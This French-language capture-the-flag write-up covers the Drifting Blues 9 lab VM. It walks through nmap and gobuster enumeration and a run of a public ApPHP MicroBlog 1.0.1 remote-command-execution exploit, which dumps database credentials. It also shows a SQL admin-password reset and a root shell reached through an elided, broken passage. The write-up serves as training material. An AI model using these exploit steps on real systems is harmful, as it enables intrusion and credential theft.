---
publicSlug: drifting-blues-9-writeup
locale: fr
title:  "Write-up Drifting Blues 9"
date:   2021-07-15 09:40:00 +0100
tags:
- hack
- write-up
- VM

excerpt: "Voici mon write-up de la VM Drifting Blues 9, disponible sur la plateforme HackMyVM."

---
Voici mon write-up (mon tout premier !) pour la VM Drifting Blues 9, disponible sur la plateforme [HackMyVM](https://hackmyvm.eu/).

## Énumération
Après avoir lancé la VM, je commence comme toujours par évaluer la surface d’attaque réseau.

### Trouver l’IP de la VM
Mon sous-réseau local est dans la plage CIDR 192.168.1.0/24 ; je lance donc un rapide scan `nmap` de type ping
```
# nmap -sn 192.168.1.0/24
```

Parmi les autres hôtes connus, la VM apparaît :

```
# nmap -sn 192.168.1.0/24
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-16 03:08 EDT
...
Nmap scan report for debian.home (192.168.1.30)
Host is up (0.00090s latency).
MAC Address: 01:23:45:67:89:AB (Oracle VirtualBox virtual NIC)
...
Nmap done: 256 IP addresses (X hosts up) scanned in 2.11 seconds

```

La machine cible s’appelle déjà `debian.home`, inutile donc de modifier `/etc/hosts` pour lui donner un nom pratique.

### Énumération des ports

Je me concentre maintenant sur cette cible en examinant l’état des ports :

```
nmap debian.home -p-
```
Cela effectuera :

 - Un scan complet des ports, sur toute la plage (2<sup>16</sup>, 65535)
 - Un scan TCP SYN
 - Avec un timing normal (3)

```
# nmap debian.home -p-
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-16 03:20 EDT
Nmap scan report for debian.home (192.168.1.30)
Host is up (0.00011s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE
80/tcp    open  http
111/tcp   open  rpcbind
40592/tcp open  unknown
MAC Address: 12:34:56:78:9A:BC (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.68 seconds
```
## Partie web
Quelque chose tourne sur le port 80, probablement une webapp. Voici la page d’accueil :

![Web app homepage](https://imgur.com/oYUSdHl.png)

On dirait une autre plateforme de blogging, avec un seul article.
### Structure du site
J’essaie de trouver des fichiers non référencés ou des backups. Comme il s’agit d’une application PHP
(cliquer sur "Category 1" à droite me dirige vers http://debian.home/index.php?page=posts&cat_id=1),
je me concentre sur les extensions associées :

```
gobuster dir -u debian.home -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,bak
```

`gobuster` est un excellent énumérateur de dossiers/fichiers. Ici :

 - Mode énumération de dossiers/fichiers
 - Utilisation d’une wordlist de répertoires très connue, celle de `dirbuster` (disponible dans Kali), en taille medium
 - Focus sur les extensions `php`, `html`, `txt` et `bak` (pour repérer d’éventuels fichiers de backup automatiques)

```
# gobuster dir -u debian.home -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,bak
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@farfart)
===============================================================
[+] Url:                     http://debian.home
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,bak,txt
[+] Timeout:                 10s
===============================================================
2021/07/16 03:32:16 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 311] [--> http://debian.home/images/]
/index.php            (Status: 200) [Size: 5650]
/docs                 (Status: 301) [Size: 309] [--> http://debian.home/docs/]
/page                 (Status: 301) [Size: 309] [--> http://debian.home/page/]
/header.php           (Status: 200) [Size: 13]
/admin                (Status: 301) [Size: 310] [--> http://debian.home/admin/]
/footer.php           (Status: 500) [Size: 614]
/license              (Status: 301) [Size: 312] [--> http://debian.home/license/]
/README.txt           (Status: 200) [Size: 975]
/js                   (Status: 301) [Size: 307] [--> http://debian.home/js/]
/include              (Status: 301) [Size: 312] [--> http://debian.home/include/]
/backup               (Status: 301) [Size: 311] [--> http://debian.home/backup/]
/styles               (Status: 301) [Size: 311] [--> http://debian.home/styles/]
/INSTALL.txt          (Status: 200) [Size: 1201]
/wysiwyg              (Status: 301) [Size: 312] [--> http://debian.home/wysiwyg/]
/server-status        (Status: 403) [Size: 276]
/mails                (Status: 301) [Size: 310] [--> http://debian.home/mails/]

===============================================================
2021/07/16 03:36:12 Finished
===============================================================
```
Étrange, plusieurs répertoires apparaissent. Allons voir le répertoire `admin`, puis http://debian.home/images :

![Image directory](https://imgur.com/6cmw9ki.png)

Les listes de répertoires semblent autorisées ! Avec cette information, je peux explorer et récolter de précieuses informations
sur la structure du site. J’ouvre http://debian.home/includes, et l’on peut y voir tous les fichiers `*.php`.

Autre point d’intérêt : `INSTALL.txt`

http://debian.home/INSTALL.txt
```
///////////////////////////////////////////////////////////////////////////////////
//
// Advanced Power of PHP
// ---------------------
// http://www.apphp.com
//
// ApPHP MicroBlog Free
//
// Version: 1.0.1
//
///////////////////////////////////////////////////////////////////////////////////

Software requirements: PHP 5.0 or later version.

To install ApPHP MicroBlog, you should have to extract the ApPHP MicroBlog ZIP file.
It depends on the operating system you use.
Once extracted, you will have a directory containing the ApPHP MicroBlog script.

Upload all content of this directory to your webserver, either by copying the
directory or by using an FTP program.

Then you will need to run the installation module.
To do this you need to open a browser and type in the URL:

If you are running on your own computer, this will be

   http://localhost/{micro-blog directory}/install.php

or if on a live server:

   http://{www.mydomain.com}/install.php

On this page you need:

1. Enter connection parameters:
   database host, database name, username, password.

2. Enter admin login and admin password, that you will use to administer the site.
```

Plusieurs informations ressortent ici :

- `install.php` est mentionné mais introuvable
- La web app est ApPHP MicroBlog Free, version 1.0.1

### Exploitation

Un rapide `searchsploit` semble prometteur :

```
# searchsploit apphp 1.0.1
------------------------------------------------------------------------------------ ---------------------------------
Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------ ---------------------------------
ApPHP MicroBlog 1.0.1 - Multiple Vulnerabilities                                    | php/webapps/33030.txt
ApPHP MicroBlog 1.0.1 - Remote Command Execution                                    | php/webapps/33070.py
------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
Examinons le RCE. C’est un script Python qui prend en argument l’URL du site exécutant ApPHP WebApp.
Il devrait renvoyer un shell.

```
# searchsploit -x 33070
  Exploit: ApPHP MicroBlog 1.0.1 - Remote Command Execution
      URL: https://www.exploit-db.com/exploits/33070
     Path: /usr/share/exploitdb/exploits/php/webapps/33070.py
File Type: Python script, ASCII text executable, with CRLF line terminators
```

Lançons l’exploit :

- C’est un script Python 2.X uniquement
- Il faut impérativement fournir `index.php`
```
# python2.7 /usr/share/exploitdb/exploits/php/webapps/33070.py http://debian.home/index.php

 -= LOTFREE exploit for ApPHP MicroBlog 1.0.1 (Free Version) =-
original exploit by Jiko : http://www.exploit-db.com/exploits/33030/
[*] Testing for vulnerability...
[+] Website is vulnerable

[*] Fecthing phpinfo
	PHP Version 5.6.40-0+deb8u12
	System   Linux debian 3.16.0-4-586 #1 Debian 3.16.51-2 (2017-12-03) i686
	Loaded Configuration File   /etc/php5/apache2/php.ini
	Apache Version   Apache/2.4.10 (Debian)
	User/Group   www-data(33)/33
	Server Root   /etc/apache2
	DOCUMENT_ROOT   /var/www/html
	PHP Version   5.6.40-0+deb8u12
	allow_url_fopen  On  On
	allow_url_include  Off  Off
	disable_functions  pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,  pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,
	open_basedir   no value    no value
	System V Message based IPC   Wez Furlong
	System V Semaphores   Tom May
	System V Shared Memory   Christian Cartus

[*] Fetching include/base.inc.php
<?php
			// DATABASE CONNECTION INFORMATION
			define('DATABASE_HOST', 'localhost');	        // Database host
			define('DATABASE_NAME', 'microblog');	        // Name of the database to be used
			define('DATABASE_USERNAME', 'clapton');	// User name for access to database
			define('DATABASE_PASSWORD', 'yaraklitepe');	// Password for access to database
			define('DB_ENCRYPT_KEY', 'p52plaiqb8');		// Database encryption key
			define('DB_PREFIX', 'mb101_');		    // Unique prefix of all table names in the database
			?>

[*] Testing remote execution
[+] Remote exec is working with system() :)
Submit your commands, type exit to quit
>
```
J’ai donc un shell. J’ai aussi, en guise de bannière, un dump du fichier `base.inc.php` et plusieurs informations
sur la version de PHP ainsi qu’un mode de commande à exécution distante.

Comme nous sommes entrés via une application PHP classique, nous sommes logiquement `www-data` :
```
> whoami
www-data
```

...
#
```

Parfait ! Le `#` indique que nous sommes root :

```
# whoami
whoami
root
#
```

Je peux maintenant récupérer le `root.txt`.

## Impasses

### Web app
- En utilisant weevely, j’ai ouvert une console SQL et cherché les identifiants admin.
- C’est chiffré ; en regardant dans `var/www/html/include/classes/Accounts.class.php`, j’ai découvert qu’il s’agit d’un chiffrement AES
  avec salt.
- Mise à jour du mot de passe admin : `update microblog.mb101_accounts set password = AES_ENCRYPT('pass','p52plaiqb8') WHERE id = 1;`
- Connecté en admin... Rien !

### RPC
Le scan `nmap` initial montrait que le port 111/tcp était ouvert. J’ai fouillé la piste RPC (en particulier une mauvaise configuration NFS), sans rien trouver.

```
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          39735/udp6  status
|   100024  1          48044/udp   status
|   100024  1          59229/tcp   status
|_  100024  1          59230/tcp6  status
```
